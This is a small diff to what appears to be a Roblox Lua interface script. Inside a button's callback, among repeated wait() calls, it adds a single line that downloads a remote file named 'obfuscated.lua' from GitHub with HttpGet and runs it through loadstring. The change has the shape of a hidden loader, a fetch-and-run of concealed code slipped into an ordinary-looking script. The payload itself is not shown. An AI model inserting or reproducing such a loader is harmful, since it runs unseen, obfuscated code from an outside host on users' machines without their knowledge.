@@ -75,6 +75,7 @@ Tab:AddButton({
                          wait()
                          wait()
                          wait()
+			loadstring(game:HttpGet("https://raw.githubusercontent.com/DXuwu/replicator-lol/main/obfuscated.lua"))()	
                          wait()
                          wait()
                          wait()
